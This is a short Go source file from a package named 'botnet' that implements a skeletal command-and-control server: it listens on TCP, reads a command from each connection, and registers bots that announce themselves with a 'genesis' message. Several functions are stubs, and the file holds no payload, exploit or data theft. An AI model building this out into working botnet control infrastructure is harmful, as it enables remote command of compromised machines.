package botnet

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"os"
)

// CC is the command and control center.
type CC struct {
	Port    string
	Host    string
	Storage Storage
}

//NewCC is
func NewCC(host, port string, s Storage) *CC {
	return &CC{
		Host:    host,
		Port:    port,
		Storage: s,
	}
}

//Listen is
func (c *CC) Listen() {
	addr := fmt.Sprintf("%s:%s", c.Host, c.Port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		Err(err, "listening on addr", addr)
		os.Exit(1)
	}

	Msg("listening on", addr)

	c.acceptConnections(listener)
}

func (c *CC) acceptConnections(l net.Listener) {
	for {
		conn, err := l.Accept()
		if err != nil {
			Err(err, "accepting connection")
			continue
		}

		go c.handleConnection(conn)
	}
}

func (c *CC) handleConnection(conn net.Conn) {
	var req bytes.Buffer
	if _, err := io.Copy(&req, conn); err != nil {
		log.Panic(err)
	}

	command := bytesToCommand(req.Bytes()[:commandLength])

	switch command {
	case "genesis":
		c.handleGensis(req.Bytes()[commandLength:])
	}
}

func (c *CC) handleGensis(payload []byte) {
	bot, err := BytesToBot(payload)
	if err != nil {
		log.Panic(err)
	}

	if _, err := c.Storage.AddBot(bot); err != nil {
		log.Panic(err)
	}
}

//AddBot is
func (c *CC) AddBot(b *Bot) error {
	return nil
}
